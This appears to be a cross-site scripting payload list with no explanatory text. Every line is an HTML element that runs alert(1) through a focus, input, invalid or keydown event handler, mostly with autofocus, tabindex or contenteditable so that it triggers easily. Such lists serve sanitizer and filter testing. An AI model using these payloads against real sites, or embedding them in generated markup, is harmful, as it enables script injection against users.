<b id=x tabindex=1 onfocus=alert(1)></b>
<base id=x tabindex=1 onfocus=alert(1)></base>
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
<big id=x tabindex=1 onfocus=alert(1)></big>
<blink id=x tabindex=1 onfocus=alert(1)></blink>
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
<body id=x tabindex=1 onfocus=alert(1)></body>
<br id=x tabindex=1 onfocus=alert(1)></br>
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>
<caption id=x tabindex=1 onfocus=alert(1)></caption>
<center id=x tabindex=1 onfocus=alert(1)></center>
<cite id=x tabindex=1 onfocus=alert(1)></cite>
<code id=x tabindex=1 onfocus=alert(1)></code>
<col id=x tabindex=1 onfocus=alert(1)></col>
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
<command id=x tabindex=1 onfocus=alert(1)></command>
<content id=x tabindex=1 onfocus=alert(1)></content>
<data id=x tabindex=1 onfocus=alert(1)></data>
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>
<dd id=x tabindex=1 onfocus=alert(1)></dd>
<del id=x tabindex=1 onfocus=alert(1)></del>
<details id=x tabindex=1 onfocus=alert(1)></details>
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>
<dir id=x tabindex=1 onfocus=alert(1)></dir>
<div id=x tabindex=1 onfocus=alert(1)></div>
<dl id=x tabindex=1 onfocus=alert(1)></dl>
<dt id=x tabindex=1 onfocus=alert(1)></dt>
<element id=x tabindex=1 onfocus=alert(1)></element>
<em id=x tabindex=1 onfocus=alert(1)></em>
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
<figure id=x tabindex=1 onfocus=alert(1)></figure>
<font id=x tabindex=1 onfocus=alert(1)></font>
<footer id=x tabindex=1 onfocus=alert(1)></footer>
<form id=x tabindex=1 onfocus=alert(1)></form>
<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
<h1 id=x tabindex=1 onfocus=alert(1)></h1>
<head id=x tabindex=1 onfocus=alert(1)></head>
<header id=x tabindex=1 onfocus=alert(1)></header>
<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
<hr id=x tabindex=1 onfocus=alert(1)></hr>
<html id=x tabindex=1 onfocus=alert(1)></html>
<i id=x tabindex=1 onfocus=alert(1)></i>
<image id=x tabindex=1 onfocus=alert(1)></image>
<img id=x tabindex=1 onfocus=alert(1)></img>
<ins id=x tabindex=1 onfocus=alert(1)></ins>
<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
<label id=x tabindex=1 onfocus=alert(1)></label>
<legend id=x tabindex=1 onfocus=alert(1)></legend>
<li id=x tabindex=1 onfocus=alert(1)></li>
<listing id=x tabindex=1 onfocus=alert(1)></listing>
<main id=x tabindex=1 onfocus=alert(1)></main>
<map id=x tabindex=1 onfocus=alert(1)></map>
<mark id=x tabindex=1 onfocus=alert(1)></mark>
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>
<menu id=x tabindex=1 onfocus=alert(1)></menu>
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
<meta id=x tabindex=1 onfocus=alert(1)></meta>
<meter id=x tabindex=1 onfocus=alert(1)></meter>
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>
<nav id=x tabindex=1 onfocus=alert(1)></nav>
<nextid id=x tabindex=1 onfocus=alert(1)></nextid>
<nobr id=x tabindex=1 onfocus=alert(1)></nobr>
<noembed id=x tabindex=1 onfocus=alert(1)></noembed>
<noframes id=x tabindex=1 onfocus=alert(1)></noframes>
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>
<ol id=x tabindex=1 onfocus=alert(1)></ol>
<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
<option id=x tabindex=1 onfocus=alert(1)></option>
<output id=x tabindex=1 onfocus=alert(1)></output>
<p id=x tabindex=1 onfocus=alert(1)></p>
<param id=x tabindex=1 onfocus=alert(1)></param>
<picture id=x tabindex=1 onfocus=alert(1)></picture>
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
<pre id=x tabindex=1 onfocus=alert(1)></pre>
<progress id=x tabindex=1 onfocus=alert(1)></progress>
<q id=x tabindex=1 onfocus=alert(1)></q>
<rb id=x tabindex=1 onfocus=alert(1)></rb>
<rp id=x tabindex=1 onfocus=alert(1)></rp>
<rt id=x tabindex=1 onfocus=alert(1)></rt>
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>
<s id=x tabindex=1 onfocus=alert(1)></s>
<samp id=x tabindex=1 onfocus=alert(1)></samp>
<script id=x tabindex=1 onfocus=alert(1)></script>
<section id=x tabindex=1 onfocus=alert(1)></section>
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>
<slot id=x tabindex=1 onfocus=alert(1)></slot>
<small id=x tabindex=1 onfocus=alert(1)></small>
<source id=x tabindex=1 onfocus=alert(1)></source>
<spacer id=x tabindex=1 onfocus=alert(1)></spacer>
<span id=x tabindex=1 onfocus=alert(1)></span>
<strike id=x tabindex=1 onfocus=alert(1)></strike>
<strong id=x tabindex=1 onfocus=alert(1)></strong>
<style id=x tabindex=1 onfocus=alert(1)></style>
<sub id=x tabindex=1 onfocus=alert(1)></sub>
<summary id=x tabindex=1 onfocus=alert(1)></summary>
<sup id=x tabindex=1 onfocus=alert(1)></sup>
<table id=x tabindex=1 onfocus=alert(1)></table>
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>
<td id=x tabindex=1 onfocus=alert(1)></td>
<template id=x tabindex=1 onfocus=alert(1)></template>
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
<th id=x tabindex=1 onfocus=alert(1)></th>
<thead id=x tabindex=1 onfocus=alert(1)></thead>
<time id=x tabindex=1 onfocus=alert(1)></time>
<title id=x tabindex=1 onfocus=alert(1)></title>
<tr id=x tabindex=1 onfocus=alert(1)></tr>
<track id=x tabindex=1 onfocus=alert(1)></track>
<tt id=x tabindex=1 onfocus=alert(1)></tt>
<u id=x tabindex=1 onfocus=alert(1)></u>
<ul id=x tabindex=1 onfocus=alert(1)></ul>
<var id=x tabindex=1 onfocus=alert(1)></var>
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
<xss id=x tabindex=1 onfocus=alert(1)></xss>
<input autofocus onfocusin=alert(1)>
<select autofocus onfocusin=alert(1)>
<textarea autofocus onfocusin=alert(1)>test</textarea>
<button autofocus onfocusin=alert(1)>test</button>
<input id=x onfocusin=alert(1)>
<input type=checkbox id=x onfocusin=alert(1)>
<input type=radio id=x onfocusin=alert(1)>
<img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
<iframe id=x onfocusin=alert(1)>
<frameset><frame id=x onfocusin=alert(1)>
<embed id=x onfocusin=alert(1) type=text/html>
<object id=x onfocusin=alert(1) type=text/html>
<svg id=x onfocusin=alert(1)>
<keygen id=x onfocusin=alert(1)>
<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>
<keygen autofocus onfocusin=alert(1)>
<a id=x tabindex=1 onfocusin=alert(1)></a>
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
<address id=x tabindex=1 onfocusin=alert(1)></address>
<applet id=x tabindex=1 onfocusin=alert(1)></applet>
<article id=x tabindex=1 onfocusin=alert(1)></article>
<aside id=x tabindex=1 onfocusin=alert(1)></aside>
<b id=x tabindex=1 onfocusin=alert(1)></b>
<base id=x tabindex=1 onfocusin=alert(1)></base>
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
<big id=x tabindex=1 onfocusin=alert(1)></big>
<blink id=x tabindex=1 onfocusin=alert(1)></blink>
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
<body id=x tabindex=1 onfocusin=alert(1)></body>
<br id=x tabindex=1 onfocusin=alert(1)></br>
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
<caption id=x tabindex=1 onfocusin=alert(1)></caption>
<center id=x tabindex=1 onfocusin=alert(1)></center>
<cite id=x tabindex=1 onfocusin=alert(1)></cite>
<code id=x tabindex=1 onfocusin=alert(1)></code>
<col id=x tabindex=1 onfocusin=alert(1)></col>
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
<command id=x tabindex=1 onfocusin=alert(1)></command>
<content id=x tabindex=1 onfocusin=alert(1)></content>
<data id=x tabindex=1 onfocusin=alert(1)></data>
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
<dd id=x tabindex=1 onfocusin=alert(1)></dd>
<del id=x tabindex=1 onfocusin=alert(1)></del>
<details id=x tabindex=1 onfocusin=alert(1)></details>
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
<dir id=x tabindex=1 onfocusin=alert(1)></dir>
<div id=x tabindex=1 onfocusin=alert(1)></div>
<dl id=x tabindex=1 onfocusin=alert(1)></dl>
<dt id=x tabindex=1 onfocusin=alert(1)></dt>
<element id=x tabindex=1 onfocusin=alert(1)></element>
<em id=x tabindex=1 onfocusin=alert(1)></em>
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
<figure id=x tabindex=1 onfocusin=alert(1)></figure>
<font id=x tabindex=1 onfocusin=alert(1)></font>
<footer id=x tabindex=1 onfocusin=alert(1)></footer>
<form id=x tabindex=1 onfocusin=alert(1)></form>
<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
<head id=x tabindex=1 onfocusin=alert(1)></head>
<header id=x tabindex=1 onfocusin=alert(1)></header>
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
<hr id=x tabindex=1 onfocusin=alert(1)></hr>
<html id=x tabindex=1 onfocusin=alert(1)></html>
<i id=x tabindex=1 onfocusin=alert(1)></i>
<image id=x tabindex=1 onfocusin=alert(1)></image>
<img id=x tabindex=1 onfocusin=alert(1)></img>
<ins id=x tabindex=1 onfocusin=alert(1)></ins>
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
<label id=x tabindex=1 onfocusin=alert(1)></label>
<legend id=x tabindex=1 onfocusin=alert(1)></legend>
<li id=x tabindex=1 onfocusin=alert(1)></li>
<listing id=x tabindex=1 onfocusin=alert(1)></listing>
<main id=x tabindex=1 onfocusin=alert(1)></main>
<map id=x tabindex=1 onfocusin=alert(1)></map>
<mark id=x tabindex=1 onfocusin=alert(1)></mark>
<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
<menu id=x tabindex=1 onfocusin=alert(1)></menu>
<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
<meta id=x tabindex=1 onfocusin=alert(1)></meta>
<meter id=x tabindex=1 onfocusin=alert(1)></meter>
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
<nav id=x tabindex=1 onfocusin=alert(1)></nav>
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
<ol id=x tabindex=1 onfocusin=alert(1)></ol>
<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
<option id=x tabindex=1 onfocusin=alert(1)></option>
<output id=x tabindex=1 onfocusin=alert(1)></output>
<p id=x tabindex=1 onfocusin=alert(1)></p>
<param id=x tabindex=1 onfocusin=alert(1)></param>
<picture id=x tabindex=1 onfocusin=alert(1)></picture>
<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
<pre id=x tabindex=1 onfocusin=alert(1)></pre>
<progress id=x tabindex=1 onfocusin=alert(1)></progress>
<q id=x tabindex=1 onfocusin=alert(1)></q>
<rb id=x tabindex=1 onfocusin=alert(1)></rb>
<rp id=x tabindex=1 onfocusin=alert(1)></rp>
<rt id=x tabindex=1 onfocusin=alert(1)></rt>
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
<s id=x tabindex=1 onfocusin=alert(1)></s>
<samp id=x tabindex=1 onfocusin=alert(1)></samp>
<script id=x tabindex=1 onfocusin=alert(1)></script>
<section id=x tabindex=1 onfocusin=alert(1)></section>
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
<slot id=x tabindex=1 onfocusin=alert(1)></slot>
<small id=x tabindex=1 onfocusin=alert(1)></small>
<source id=x tabindex=1 onfocusin=alert(1)></source>
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
<span id=x tabindex=1 onfocusin=alert(1)></span>
<strike id=x tabindex=1 onfocusin=alert(1)></strike>
<strong id=x tabindex=1 onfocusin=alert(1)></strong>
<style id=x tabindex=1 onfocusin=alert(1)></style>
<sub id=x tabindex=1 onfocusin=alert(1)></sub>
<summary id=x tabindex=1 onfocusin=alert(1)></summary>
<sup id=x tabindex=1 onfocusin=alert(1)></sup>
<table id=x tabindex=1 onfocusin=alert(1)></table>
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
<td id=x tabindex=1 onfocusin=alert(1)></td>
<template id=x tabindex=1 onfocusin=alert(1)></template>
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
<th id=x tabindex=1 onfocusin=alert(1)></th>
<thead id=x tabindex=1 onfocusin=alert(1)></thead>
<time id=x tabindex=1 onfocusin=alert(1)></time>
<title id=x tabindex=1 onfocusin=alert(1)></title>
<tr id=x tabindex=1 onfocusin=alert(1)></tr>
<track id=x tabindex=1 onfocusin=alert(1)></track>
<tt id=x tabindex=1 onfocusin=alert(1)></tt>
<u id=x tabindex=1 onfocusin=alert(1)></u>
<ul id=x tabindex=1 onfocusin=alert(1)></ul>
<var id=x tabindex=1 onfocusin=alert(1)></var>
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
<xss id=x tabindex=1 onfocusin=alert(1)></xss>
<input onfocusout=alert(1) id=x><input autofocus>
<textarea onfocusout=alert(1) id=x></textarea><input autofocus>
<button onfocusout=alert(1) id=x></button><input autofocus>
<select onfocusout=alert(1) id=x></select><input autofocus>
<body onfocusout=alert(1) id=x><iframe id=x>
<iframe onfocusout=alert(1) id=x><input autofocus>
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>
<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>
<canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>
<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>
<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>
<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>
<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>
<embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>
<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>
<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>
<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>
<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>
<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>
<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>
<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
<menu onfocusout=alert(1) tabindex=1 id=x></menu><input autofocus>
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>
<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>
<multicol onfocusout=alert(1) tabindex=1 id=x></multicol><input autofocus>
<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>
<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>
<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>
<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>
<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>
<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>
<option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>
<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>
<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>
<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
<body onhashchange="alert(1)">
<input oninput=alert(1) value=xss>
<textarea oninput=alert(1)>XSS</textarea>
<form><input oninvalid=alert(1) required><input type=submit>
<form><textarea oninvalid=alert(1) required><input type=submit>
<a onkeydown="alert(1)" contenteditable>test</a>
<abbr onkeydown="alert(1)" contenteditable>test</abbr>
<acronym onkeydown="alert(1)" contenteditable>test</acronym>
<address onkeydown="alert(1)" contenteditable>test</address>
<applet onkeydown="alert(1)" contenteditable>test</applet>
<area onkeydown="alert(1)" contenteditable>test</area>
<article onkeydown="alert(1)" contenteditable>test</article>
<aside onkeydown="alert(1)" contenteditable>test</aside>
<audio onkeydown="alert(1)" contenteditable>test</audio>
<b onkeydown="alert(1)" contenteditable>test</b>
<base onkeydown="alert(1)" contenteditable>test</base>
<basefont onkeydown="alert(1)" contenteditable>test</basefont>
<bdi onkeydown="alert(1)" contenteditable>test</bdi>
<bdo onkeydown="alert(1)" contenteditable>test</bdo>
<bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
<big onkeydown="alert(1)" contenteditable>test</big>
<blink onkeydown="alert(1)" contenteditable>test</blink>
<blockquote onkeydown="alert(1)" contenteditable>test</blockquote>
<body onkeydown="alert(1)" contenteditable>test</body>
<br onkeydown="alert(1)" contenteditable>test</br>
<button onkeydown="alert(1)" contenteditable>test</button>
<canvas onkeydown="alert(1)" contenteditable>test</canvas>
<caption onkeydown="alert(1)" contenteditable>test</caption>
<center onkeydown="alert(1)" contenteditable>test</center>
<cite onkeydown="alert(1)" contenteditable>test</cite>
<code onkeydown="alert(1)" contenteditable>test</code>
<col onkeydown="alert(1)" contenteditable>test</col>
<colgroup onkeydown="alert(1)" contenteditable>test</colgroup>
<command onkeydown="alert(1)" contenteditable>test</command>
<content onkeydown="alert(1)" contenteditable>test</content>
<data onkeydown="alert(1)" contenteditable>test</data>
<datalist onkeydown="alert(1)" contenteditable>test</datalist>
<dd onkeydown="alert(1)" contenteditable>test</dd>
<del onkeydown="alert(1)" contenteditable>test</del>
<details onkeydown="alert(1)" contenteditable>test</details>
<dfn onkeydown="alert(1)" contenteditable>test</dfn>
<dialog onkeydown="alert(1)" contenteditable>test</dialog>
<dir onkeydown="alert(1)" contenteditable>test</dir>
<div onkeydown="alert(1)" contenteditable>test</div>
<dl onkeydown="alert(1)" contenteditable>test</dl>
<dt onkeydown="alert(1)" contenteditable>test</dt>
<element onkeydown="alert(1)" contenteditable>test</element>
<em onkeydown="alert(1)" contenteditable>test</em>
<embed onkeydown="alert(1)" contenteditable>test</embed>
<fieldset onkeydown="alert(1)" contenteditable>test</fieldset>
<figcaption onkeydown="alert(1)" contenteditable>test</figcaption>
<figure onkeydown="alert(1)" contenteditable>test</figure>
<font onkeydown="alert(1)" contenteditable>test</font>
<footer onkeydown="alert(1)" contenteditable>test</footer>
<form onkeydown="alert(1)" contenteditable>test</form>
<frame onkeydown="alert(1)" contenteditable>test</frame>
<frameset onkeydown="alert(1)" contenteditable>test</frameset>
<h1 onkeydown="alert(1)" contenteditable>test</h1>
<head onkeydown="alert(1)" contenteditable>test</head>
<header onkeydown="alert(1)" contenteditable>test</header>
<hgroup onkeydown="alert(1)" contenteditable>test</hgroup>
<hr onkeydown="alert(1)" contenteditable>test</hr>
<html onkeydown="alert(1)" contenteditable>test</html>
<i onkeydown="alert(1)" contenteditable>test</i>
<iframe onkeydown="alert(1)" contenteditable>test</iframe>
<image onkeydown="alert(1)" contenteditable>test</image>
<img onkeydown="alert(1)" contenteditable>test</img>
<input onkeydown="alert(1)" contenteditable>test</input>
<ins onkeydown="alert(1)" contenteditable>test</ins>
<isindex onkeydown="alert(1)" contenteditable>test</isindex>
<kbd onkeydown="alert(1)" contenteditable>test</kbd>
<keygen onkeydown="alert(1)" contenteditable>test</keygen>
<label onkeydown="alert(1)" contenteditable>test</label>
<legend onkeydown="alert(1)" contenteditable>test</legend>
<li onkeydown="alert(1)" contenteditable>test</li>
<link onkeydown="alert(1)" contenteditable>test</link>
<listing onkeydown="alert(1)" contenteditable>test</listing>
<main onkeydown="alert(1)" contenteditable>test</main>
<map onkeydown="alert(1)" contenteditable>test</map>
<mark onkeydown="alert(1)" contenteditable>test</mark>
<marquee onkeydown="alert(1)" contenteditable>test</marquee>
<menu onkeydown="alert(1)" contenteditable>test</menu>
<menuitem onkeydown="alert(1)" contenteditable>test</menuitem>
<meta onkeydown="alert(1)" contenteditable>test</meta>
<meter onkeydown="alert(1)" contenteditable>test</meter>
<multicol onkeydown="alert(1)" contenteditable>test</multicol>
<nav onkeydown="alert(1)" contenteditable>test</nav>
<nextid onkeydown="alert(1)" contenteditable>test</nextid>
<nobr onkeydown="alert(1)" contenteditable>test</nobr>
<noembed onkeydown="alert(1)" contenteditable>test</noembed>
<noframes onkeydown="alert(1)" contenteditable>test</noframes>
<noscript onkeydown="alert(1)" contenteditable>test</noscript>
<object onkeydown="alert(1)" contenteditable>test</object>
<ol onkeydown="alert(1)" contenteditable>test</ol>
<optgroup onkeydown="alert(1)" contenteditable>test</optgroup>
<option onkeydown="alert(1)" contenteditable>test</option>
